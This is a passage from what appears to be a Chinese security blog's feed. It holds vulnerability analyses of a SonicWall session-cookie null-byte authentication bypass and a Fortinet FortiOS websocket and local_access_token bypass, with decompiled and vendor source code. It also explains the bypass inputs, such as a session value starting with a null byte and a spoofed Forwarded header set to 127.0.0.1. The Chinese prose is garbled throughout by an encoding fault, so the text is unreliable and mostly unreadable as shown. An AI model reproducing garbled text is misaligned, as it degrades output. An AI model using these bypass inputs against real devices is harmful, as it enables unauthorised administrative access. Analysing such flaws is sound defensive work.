<p>ä¼ å…¥çš„ 32 å­—èŠ‚ session æ•°æ®æœ€åä¸€ä¸ªå­—èŠ‚è¡¨ç¤º checksumï¼Œè®¡ç®—æ–¹å¼ä¸ºä»ç¬¬ä¸€ä¸ªå­—èŠ‚åˆ°ç¬¬ 31 ä¸ªå­—èŠ‚ä¸¤ä¸¤å¼‚æˆ–ï¼Œæœ€ç»ˆå¾—åˆ°çš„ä¸€ä¸ªå­—èŠ‚æ•°æ®ä½¿ç”¨ BASE64 ç¼–ç ï¼Œç¼–ç åçš„ç»“æœç¬¬ä¸€ä¸ªå­—èŠ‚å°±æ˜¯ checksumï¼Œæ”¾åœ¨ session çš„ç¬¬ 32 ä¸ªå­—èŠ‚ä½ç½®ï¼Œæ¥ç€ä¼šè°ƒç”¨ <code>find_cookie</code> å‡½æ•°å¼€å§‹æ ¡éªŒ sessionã€‚</p>
<h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p><code>find_cookie</code> å‡½æ•°å†…å®¹å¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">find_cookie</span><span class="params">(__int64 raw_str, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 obj; <span class="comment">// r12</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> chr; <span class="comment">// dl</span></span><br><span class="line">  <span class="type">char</span> target; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !raw_str )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  obj = *session_list[<span class="number">7</span> * a2];</span><br><span class="line">  <span class="keyword">if</span> ( !obj )</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">  v7 = obj + <span class="number">40</span>;</span><br><span class="line">  lock_list(obj + <span class="number">40</span>, <span class="string">&quot;ListProtect&quot;</span>, <span class="number">74</span>);       <span class="comment">// é”å®šåˆ—è¡¨</span></span><br><span class="line">  <span class="keyword">for</span> ( obj = *(obj + <span class="number">16</span>); obj; obj = *(obj + <span class="number">8</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      chr = *(raw_str + v3);                    <span class="comment">// è·å–ä¸€ä¸ªå­—èŠ‚</span></span><br><span class="line">      <span class="keyword">if</span> ( !chr || (target = *(obj + v3 + <span class="number">28</span>)) == <span class="number">0</span> )<span class="comment">// å¦‚æœ cookie ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯ null çš„è¯ï¼Œè¿™é‡Œä¼šç›´æ¥è¿”å›ç¬¬ä¸€æ¡è®°å½•</span></span><br><span class="line">      &#123;</span><br><span class="line">LABEL_9:</span><br><span class="line">        release_list(v7, <span class="string">&quot;ListRelease&quot;</span>, <span class="number">79</span>);</span><br><span class="line">        <span class="keyword">return</span> obj;                             <span class="comment">// &lt;---- here</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( chr != target )                      <span class="comment">// æ¯”è¾ƒ session å­—èŠ‚</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ++v3 == <span class="number">32</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  release_list(v7, <span class="string">&quot;ListRelease&quot;</span>, <span class="number">79</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æˆ‘åœ¨ä»£ç ä¸­æ·»åŠ äº†ä¸€äº›æ³¨é‡Šï¼Œä¸‹é¢æˆ‘ä»¬æ¥è¯¦ç»†è§£é‡Šä¸€ä¸‹æŸ¥æ‰¾ session çš„æµç¨‹ã€‚</p>
<p><code>session_list</code> æ˜¯ä¸€ä¸ªå…¨å±€åˆ—è¡¨ï¼Œç”¨äºä¿å­˜å·²ç»ç™»å½•çš„ VPN ç”¨æˆ·ä¼šè¯ä¿¡æ¯ï¼Œä»£ç å…ˆä½¿ç”¨ <code>lock_list</code> é”å®š session åˆ—è¡¨ï¼Œç„¶åè¿›å…¥ä¸€ä¸ªå¾ªç¯ï¼Œå…ˆè·å–åˆ—è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªæˆå‘˜ï¼Œå­˜æ”¾åˆ° obj å˜é‡ã€‚éšåå¼€å§‹é€å­—èŠ‚éå†ä»å¤–éƒ¨ä¼ å…¥çš„ session æ•°æ®ï¼Œå’Œ obj ä¸­ä¿å­˜çš„ session æ¯”è¾ƒï¼Œå¦‚æœ 32 ä¸ªå­—èŠ‚éƒ½æ¯”è¾ƒæˆåŠŸï¼Œåˆ™è¯´æ˜æ‰¾åˆ°äº†æ­£ç¡®çš„ä¼šè¯ä¿¡æ¯ï¼Œé‰´æƒæˆåŠŸã€‚</p>
<p>è¿™é‡Œçš„é—®é¢˜åœ¨äºï¼Œä»£ç è·å–äº†å¤–éƒ¨ä¼ å…¥ session çš„ä¸€ä¸ªå­—èŠ‚ä¹‹åï¼Œä¼šå…ˆåœ¨ if æ¡ä»¶ä¸­åˆ¤æ–­è·å–åˆ°çš„è¿™ä¸ªå­—èŠ‚æ˜¯å¦ä¸º NULLï¼Œå¦‚æœæ˜¯å°±é‡Šæ”¾ session åˆ—è¡¨å¹¶è¿”å› <strong>obj å¯¹è±¡</strong>ã€‚å‡è®¾æˆ‘ä»¬ä¼ å…¥ session ä¸º <code>\x00abcd</code>ï¼Œé‚£ä¹ˆ <code>find_cookie</code> å‡½æ•°å°±ä¼šç›´æ¥è¿”å› session åˆ—è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå¯¹è±¡ï¼Œè·³è¿‡åç»­çš„å­—ç¬¦éªŒè¯ï¼Œè¿™æ ·å°±å¯ä»¥ç›´æ¥è·å¾—åˆ—è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªç”¨æˆ·ä¼šè¯ä¿¡æ¯ï¼Œé€ æˆèº«ä»½éªŒè¯ç»•è¿‡ã€‚æ­¤å¤–ï¼Œç”±äº session ç”±å°å†™å­—æ¯ç»„æˆï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶ç¬¬äºŒä¸ªå­—èŠ‚ä¸º NULLï¼Œéå†ç¬¬ä¸€ä¸ªå­—èŠ‚æ¥è·å– session åˆ—è¡¨ä¸­çš„å…¶å®ƒç”¨æˆ·ä¿¡æ¯ã€‚</p>
<h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a class="link"   href="https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2025-0003" >https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2025-0003<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.zerodayinitiative.com/advisories/ZDI-25-012/" >https://www.zerodayinitiative.com/advisories/ZDI-25-012/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://attackerkb.com/topics/UB3P3xHVAo/cve-2024-53704/rapid7-analysis" >https://attackerkb.com/topics/UB3P3xHVAo/cve-2024-53704/rapid7-analysis<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2024-55591</title>
    <url>/2025/01/22/CVE-2024-55591/</url>
    <content><![CDATA[<p>2025 å¹´ 1 æœˆ 14 æ—¥ï¼ŒFortinet å…¬å¼€äº†å½±å“ FortiOSã€FortiProxy æœ‰é™å‡ ä¸ªç‰ˆæœ¬çš„èº«ä»½éªŒè¯ç»•è¿‡æ¼æ´ <a class="link"   href="https://fortiguard.fortinet.com/psirt/FG-IR-24-535" >CVE-2024-55591<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ï¼Œæœ¬æ–‡å¯¹æ­¤æ¼æ´è¿›è¡Œç®€è¦åˆ†æã€‚</p>
<p><strong>è¯¥æ¼æ´å·²å‘ç°åœ¨é‡åˆ©ç”¨ï¼Œå»ºè®®å—å½±å“çš„ç”¨æˆ·åŠæ—¶æ›´æ–°ç³»ç»Ÿç‰ˆæœ¬ã€‚</strong></p>
<span id="more"></span>

<h1 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h1><p>æ ¹æ® Fortinet å‘å¸ƒçš„å…¬å‘Šå¯çŸ¥ï¼Œè¿™ä¸ªæ¼æ´å­˜åœ¨äº Node.js çš„ websocket æ¨¡å—ä¸­ã€‚æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´å¯ä»¥è·å–ç³»ç»Ÿçš„ç®¡ç†å‘˜æƒé™å¹¶æ‰§è¡Œä»»æ„ CLI å‘½ä»¤ï¼Œæ¼æ´ä»…å½±å“ FortiOS 7.0.x ä»¥åŠ FortiProxy 7.0.xã€7.2.xã€‚</p>
<p>å¦å¤–æ ¹æ® IOC ä¿¡æ¯å¯çŸ¥ï¼Œæ”»å‡»è€…æœ€ç»ˆé€šè¿‡ jsconsole ç™»å½•åˆ°ç³»ç»Ÿï¼Œjsconsole å°±æ˜¯ FortiOS web åå°æä¾›çš„ CLI æ¥å£ã€‚æ‰€ä»¥æ¼æ´åº”è¯¥ä½äºç®¡ç†ç«¯å£ä¸­ï¼Œå¯èƒ½é€šè¿‡æŸç§æ–¹æ³•è·³è¿‡äº†é‰´æƒè¿‡ç¨‹ï¼Œå¯ä»¥ç›´æ¥è®¿é—®åˆ° web-cli æ¥å£ã€‚</p>
<h1 id="CVE-2022-40684"><a href="#CVE-2022-40684" class="headerlink" title="CVE-2022-40684"></a>CVE-2022-40684</h1><p>åœ¨è¿›ä¸€æ­¥åˆ†ææ¼æ´ä¹‹å‰ï¼Œæœ‰å¿…è¦å…ˆåˆ†æä¸€ä¸‹ CVE-2022-40684ã€‚è¿™æ˜¯ä¸€ä¸ªå…¬å¸ƒäº 2022 å¹´ 10 æœˆçš„ï¼ŒåŒæ ·ä¹Ÿæ˜¯å½±å“ FortiOS ç®¡ç†ç«¯å£çš„èº«ä»½éªŒè¯ç»•è¿‡æ¼æ´ã€‚å½“å‰ç½‘ç»œä¸Šå·²ç»æœ‰å¾ˆå¤šç›¸å…³çš„å¤ç°åˆ†ææ–‡ç« ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œåªåšç®€è¦æ€»ç»“ã€‚</p>
<p>é¦–å…ˆè¦æ˜ç¡® FortiOS ç®¡ç†ç«¯å£çš„åŸºæœ¬è¯·æ±‚å¤„ç†è¿‡ç¨‹ï¼Œåœ¨å‰é¢å­˜åœ¨ä¸€ä¸ª Node.js æœåŠ¡ï¼Œåç«¯è¿è¡Œçš„æ˜¯ httpsd web æœåŠ¡å™¨ï¼Œå®ç°äº†ä¸€ä¸ªç±»ä¼¼è´Ÿè½½å‡è¡¡çš„ç»“æ„ï¼ŒNode.js æ¥æ”¶è¯·æ±‚ä¼šå‘é€åˆ°åç«¯æŸä¸ª httpsd è¿›ç¨‹ä¸­ã€‚</p>
<p>åœ¨ Node.js å’Œ httpsd ä¸­å„æœ‰ä¸€å¥—èº«ä»½éªŒè¯é€»è¾‘ï¼ŒNode.js çš„è§’è‰²ç±»ä¼¼äº Nginx ä»£ç†ï¼Œå®ƒåœ¨è½¬å‘è¯·æ±‚æ—¶ï¼Œä¼šåœ¨è¯·æ±‚ä¸­é™„åŠ ä¸€ä¸ª Forwarded è¯·æ±‚å¤´ï¼Œå…¶ä¸­ for å’Œ by å­—æ®µè¡¨ç¤ºè½¬å‘è¯¥è¯·æ±‚çš„ä»£ç†æœåŠ¡å™¨ IP ä»¥åŠè¯·æ±‚çš„æ¥æº IPã€‚åœ¨ httpsd ä¸­ï¼Œå¯¹è¯·æ±‚è¿›è¡Œé‰´æƒæ—¶è°ƒç”¨ <code>fweb_authorize_all</code> å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¼šè§£æ Forwarded è¯·æ±‚å¤´ï¼Œè·å–å…¶ä¸­çš„ for å­—æ®µå†…å®¹ï¼Œå¹¶ä¸”å°†è·å–åˆ°çš„ IP èµ‹å€¼ç»™ Client-IPã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2024-55591-1.png"
                     
                ></p>
<p>éšåçš„é‰´æƒæµç¨‹åœ¨ <code>api_access_check_for_trusted_access</code> å‡½æ•°ä¸­ä¼šæ£€æŸ¥ Client-IP ä»¥åŠ User-Agent çš„å€¼ï¼Œå¦‚æœå‰è€…ä¸º 127.0.0.1ï¼Œåè€…ä¸º Node.js æˆ–è€… Report Runnerï¼Œåˆ™ä¼šè®¤ä¸ºè¯·æ±‚æ¥è‡ªäºæœ¬åœ°ï¼Œè·³è¿‡åç»­é‰´æƒæµç¨‹ï¼ŒåŒæ—¶è®¾ç½®å½“å‰ç”¨æˆ·èº«ä»½ä¸º <code>Local_Process_Access</code>ã€‚</p>
<p>ç”±äºä»£ç æ²¡æœ‰é™åˆ¶ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨è¯·æ±‚ä¸­æ·»åŠ ä¸€ä¸ªæ–°çš„ Forwarded è¯·æ±‚å¤´ï¼Œå¹¶å°† for å€¼è®¾ç½®ä¸º 127.0.0.1ï¼Œè¿™æ ·æ‰‹åŠ¨è®¾ç½®çš„ for å°±ä¼šè¢«æ·»åŠ åˆ° Forwarded æœ«å°¾ï¼Œä»è€Œåœ¨ httpsd ä¸­èƒ½å¤Ÿæ§åˆ¶ Client-IP çš„å€¼ï¼Œå®ç°èº«ä»½éªŒè¯ç»•è¿‡ã€‚</p>
<h1 id="Node-js-é‰´æƒç»•è¿‡"><a href="#Node-js-é‰´æƒç»•è¿‡" class="headerlink" title="Node.js é‰´æƒç»•è¿‡"></a>Node.js é‰´æƒç»•è¿‡</h1><p>ç®€è¦æ€»ç»“äº† CVE-2022-40684 æ¼æ´æˆå› ï¼Œä¸‹é¢æˆ‘ä»¬æ¥çœ‹çœ‹åœ¨ 7.0.x ç‰ˆæœ¬ä¸­ï¼Œå¯¹äº Websocket è¯·æ±‚æ˜¯å¦‚ä½•å¤„ç†çš„ã€‚</p>
<p>ä»¥ 7.0.8 ç‰ˆæœ¬ä¸ºä¾‹ï¼Œå½“ç”¨æˆ·å‘é€ä¸€ä¸ª Websocket å»ºç«‹è¯·æ±‚æ—¶ï¼ŒNode.js ä¸­ä¼šè°ƒç”¨ <code>WebAuth.getValidatedSession</code> æ¥é‰´æƒã€‚</p>
<div class="code-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="title function_">getValidatedSession</span>(<span class="params">request, options = &#123;&#125;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> authToken = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">_extractToken</span>(request);</span><br><span class="line">    <span class="keyword">let</span> session = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (authToken) &#123;</span><br><span class="line">        <span class="comment">// Try using cache before hitting REST API.</span></span><br><span class="line">        <span class="keyword">const</span> sessionEntry = webSession.<span class="title function_">get</span>(authToken);</span><br><span class="line">        <span class="keyword">if</span> (sessionEntry) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_logger</span>.<span class="title function_">info</span>(<span class="string">`Token &quot;<span class="subst">$&#123;authToken&#125;</span>&quot; found in session cache.`</span>,</span><br><span class="line">                &#123;<span class="attr">groupContext</span>: options.<span class="property">groupContext</span>&#125;);</span><br><span class="line">            session = sessionEntry.<span class="property">session</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!session) &#123;</span><br><span class="line">        <span class="comment">// Try and retrieve session from REST API</span></span><br><span class="line">        session = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">_getAdminSession</span>(request,</span><br><span class="line">            &#123;<span class="attr">groupContext</span>: options.<span class="property">groupContext</span>&#125;);</span><br><span class="line">        <span class="keyword">if</span> (session) &#123;</span><br><span class="line">            <span class="comment">// Convert VDOMs to set for faster lookup.</span></span><br><span class="line">            session.<span class="property">vdoms</span> = <span class="keyword">new</span> <span class="title class_">Set</span>(session.<span class="property">vdoms</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (authToken) &#123;</span><br><span class="line">                <span class="comment">// FGFM requests do not have an authentication token and can never use the</span></span><br><span class="line">                <span class="comment">// session cache.</span></span><br><span class="line">                webSession.<span class="title function_">add</span>(authToken, session);</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">_logger</span>.<span class="title function_">info</span>(<span class="string">`Token &quot;<span class="subst">$&#123;authToken&#125;</span>&quot; added to session cache.`</span>,</span><br><span class="line">                    &#123;<span class="attr">groupContext</span>: options.<span class="property">groupContext</span>&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (authToken) &#123;</span><br><span class="line">        <span class="comment">// FGFM requests do not have an authentication token and are exempt from CSRF</span></span><br><span class="line">        <span class="comment">// validation.</span></span><br><span class="line">        <span class="keyword">if</span> (!(<span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">_csrfValidation</span>(request, &#123;<span class="attr">groupContext</span>: options.<span class="property">groupContext</span>&#125;))) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_logger</span>.<span class="title function_">error</span>(<span class="string">&#x27;Request fails CSRF validation.&#x27;</span>,</span><br><span class="line">                &#123;<span class="attr">groupContext</span>: options.<span class="property">groupContext</span>&#125;);</span><br><span class="line">            session = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å‡½æ•°é¦–å…ˆä¼šä½¿ç”¨ <code>_extractToken</code> å°è¯•ä»è¯·æ±‚çš„ Cookie ä¸­è·å– authtokenï¼Œå¦‚æœè·å–å¤±è´¥å°±è°ƒç”¨ <code>_getAdminSession</code> è¿›è¡Œé‰´æƒã€‚</p>
<div class="code-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="title function_">_getAdminSession</span>(<span class="params">request, options = &#123;&#125;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; headers, url &#125; = request;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Arguments to module</span></span><br><span class="line">    <span class="keyword">const</span> query = querystring.<span class="title function_">parse</span>(url.<span class="title function_">replace</span>(<span class="regexp">/.*\?/</span>, <span class="string">&#x27;&#x27;</span>));</span><br><span class="line">    <span class="comment">// Authentication/Authorization</span></span><br><span class="line">    <span class="keyword">const</span> localToken  = query.<span class="property">local_access_token</span>;</span><br><span class="line">    <span class="keyword">const</span> cookie      = headers[<span class="string">&#x27;:cookie&#x27;</span>] || headers.<span class="property">cookie</span>;</span><br><span class="line">    <span class="keyword">const</span> apiKey      = !cookie ? <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">_extractToken</span>(request) : <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">const</span> authParams     = [<span class="string">&#x27;monitor&#x27;</span>, <span class="string">&#x27;web-ui&#x27;</span>, <span class="string">&#x27;node-auth&#x27;</span>];</span><br><span class="line">    <span class="keyword">let</span> authParamsFound = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">let</span> isFgfmReq = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        isFgfmReq = nodeSockopt.<span class="title function_">isFgfmReq</span>(request.<span class="property">socket</span>.<span class="property">_handle</span>.<span class="property">fd</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="comment">// Ignore error, and process request as regular request</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_logger</span>.<span class="title function_">warn</span>(err, &#123;<span class="attr">groupContext</span>: options.<span class="property">groupContext</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isFgfmReq) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_logger</span>.<span class="title function_">info</span>(<span class="string">&#x27;FGFM request detected.&#x27;</span>, &#123;<span class="attr">groupContext</span>: options.<span class="property">groupContext</span>&#125;);</span><br><span class="line">        authParams.<span class="title function_">push</span>(<span class="variable language_">this</span>.<span class="title function_">_createFgfmFetchOptions</span>(request));</span><br><span class="line">        authParamsFound = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cookie || apiKey) &#123;</span><br><span class="line">        <span class="comment">// x-forwarded header is needed for API key as well</span></span><br><span class="line">        <span class="keyword">if</span> (apiKey) &#123;</span><br><span class="line">            authParams[authParams.<span class="property">length</span> - <span class="number">1</span>] += <span class="string">`?<span class="subst">$&#123;SYMBOLS.API_KEY_PARAM&#125;</span>=<span class="subst">$&#123;apiKey&#125;</span>`</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        authParams.<span class="title function_">push</span>(<span class="variable language_">this</span>.<span class="title function_">_createFetchOptions</span>(request));</span><br><span class="line">        authParamsFound = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (localToken) &#123;</span><br><span class="line">        authParams[authParams.<span class="property">length</span> - <span class="number">1</span>] += <span class="string">`?local_access_token=<span class="subst">$&#123;localToken&#125;</span>`</span>;</span><br><span class="line">        authParamsFound = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!authParamsFound) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_logger</span>.<span class="title function_">warn</span>(<span class="string">&#x27;No authorization headers found. Authentication failed.&#x27;</span>,</span><br><span class="line">            &#123;<span class="attr">groupContext</span>: options.<span class="property">groupContext</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_logger</span>.<span class="title function_">warn</span>(<span class="string">&#x27;Sending authentication request to REST API.&#x27;</span>,</span><br><span class="line">            &#123;<span class="attr">groupContext</span>: options.<span class="property">groupContext</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">ApiFetch</span>(...authParams);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_logger</span>.<span class="title function_">warn</span>(<span class="string">`Failed to authenticate user (<span class="subst">$&#123;e&#125;</span>).`</span>,</span><br><span class="line">            &#123;<span class="attr">groupContext</span>: options.<span class="property">groupContext</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>åˆ†æè¿™ä¸ªå‡½æ•°é€»è¾‘ï¼Œå®ƒä¸»è¦æ”¯æŒ 3 ç§èº«ä»½éªŒè¯æ–¹å¼ï¼š</p>
<ol>
<li>Fgfm æ¨¡å¼ï¼Œå½“è¯·æ±‚æ¥è‡ªäº FortiManager æ—¶ä½¿ç”¨</li>
<li>è¯·æ±‚å­˜åœ¨ Cookie è¯·æ±‚å¤´ï¼Œå°±ä¼šè°ƒç”¨ <code>_createFetchOptions</code> æ„é€ èº«ä»½è®¤è¯å‚æ•°</li>
<li>è¯·æ±‚çš„ query string ä¸­ä¼ å…¥çš„ local access tokenï¼Œç›´æ¥æŠŠä¼ å…¥çš„å‚æ•°ä½œä¸ºèº«ä»½è®¤è¯å‚æ•°ä½¿ç”¨</li>
</ol>
<p>æ ¸å¿ƒå°±æ˜¯é€šè¿‡ä¸åŒæ–¹å¼æ¥è®¾ç½® authParams å‚æ•°å€¼ï¼Œæœ€ç»ˆä¼šæ„é€  <code>ApiFetch</code> å¼€å§‹èº«ä»½è®¤è¯æµç¨‹ã€‚</p>
<p>å¯¹äºç¬¬äºŒç§æ–¹å¼ï¼Œ<code>_createFetchOptions</code> å‡½æ•°å†…å®¹å¦‚ä¸‹</p>
<div class="code-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">_createFetchOptions</span>(<span class="params">request</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> newOptions = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy only authorization related headers</span></span><br><span class="line">    newOptions.<span class="property">headers</span> = &#123;&#125;;</span><br><span class="line">    <span class="keyword">if</span> (request.<span class="property">headers</span>[<span class="string">&#x27;user-agent&#x27;</span>] != <span class="literal">null</span>) &#123;</span><br><span class="line">        newOptions.<span class="property">headers</span>[<span class="string">&#x27;user-agent&#x27;</span>] = request.<span class="property">headers</span>[<span class="string">&#x27;user-agent&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (request.<span class="property">headers</span>.<span class="property">cookie</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">        newOptions.<span class="property">headers</span>.<span class="property">cookie</span> = request.<span class="property">headers</span>.<span class="property">cookie</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (request.<span class="property">headers</span>[<span class="string">&#x27;x-csrftoken&#x27;</span>] != <span class="literal">null</span>) &#123;</span><br><span class="line">        newOptions.<span class="property">headers</span>[<span class="string">&#x27;x-csrftoken&#x27;</span>] = request.<span class="property">headers</span>[<span class="string">&#x27;x-csrftoken&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (request.<span class="property">headers</span>.<span class="property">authorization</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">        newOptions.<span class="property">headers</span>.<span class="property">authorization</span> = request.<span class="property">headers</span>.<span class="property">authorization</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This is needed for authorization</span></span><br><span class="line">    <span class="keyword">if</span> (request.<span class="property">socket</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// use socket&#x27;s address info as forwarded</span></span><br><span class="line">        <span class="keyword">const</span> &#123;localAddress, localPort, remoteAddress, remotePort&#125; = request.<span class="property">socket</span>;</span><br><span class="line">        newOptions.<span class="property">headers</span>.<span class="property">Forwarded</span> = <span class="string">`by=&quot;[<span class="subst">$&#123;localAddress&#125;</span>]:<span class="subst">$&#123;localPort&#125;</span>&quot;;`</span> +</span><br><span class="line">            <span class="string">`for=&quot;[<span class="subst">$&#123;remoteAddress&#125;</span>]:<span class="subst">$&#123;remotePort&#125;</span>&quot;`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> newOptions;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªå‡½æ•°çš„é‡ç‚¹åœ¨äºå®ƒä¼šå°† newOptions å³æœ€ç»ˆçš„ authParams é‡Œé¢çš„ User-Agent è¦†ç›–ä¸ºè¯·æ±‚ä¸­çš„ User-Agentï¼Œå¹¶ä¸”ä¿®æ”¹ Forwarded è¯·æ±‚å¤´ï¼Œå°†æº IP åœ°å€è®¾ç½®ä¸ºå®¢æˆ·ç«¯çš„ socket åœ°å€ã€‚è¿™å’Œå‰é¢æåˆ°çš„ CVE-2022-40684 æœ‰ä¸€å®šå…³ç³»ï¼Œä»£ç é™åˆ¶äº† Forwarded å¯èƒ½çš„å–å€¼ï¼Œç”¨æˆ·ä¹Ÿå°±æ— æ³•ä¼ªé€ å¹¶æ§åˆ¶ httpsd ä¸­çš„ Client-IP å–å€¼ã€‚</p>
<p>ä½†å½“ä½¿ç”¨ local access token æ–¹å¼è¿›è¡ŒéªŒè¯æ—¶ï¼Œä»£ç åªä¼šè®¾ç½®ä¸€ä¸ª <code>local_access_token</code> å‚æ•°ï¼Œä¸ä¼šè°ƒç”¨ <code>_createFetchOptions</code>ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒauthParams å„ä¸ªå‚æ•°å°±ä¼šå–å½“å‰çš„é»˜è®¤å€¼ï¼Œæœ€å…³é”®çš„æ˜¯ä¸ä¼šä¿®æ”¹ Forwarded è¯·æ±‚å¤´ã€‚</p>
<p>æ¥ç€è°ƒç”¨ ApiFetch å¼€å§‹å‘åç«¯å‘é€é‰´æƒè¯·æ±‚</p>
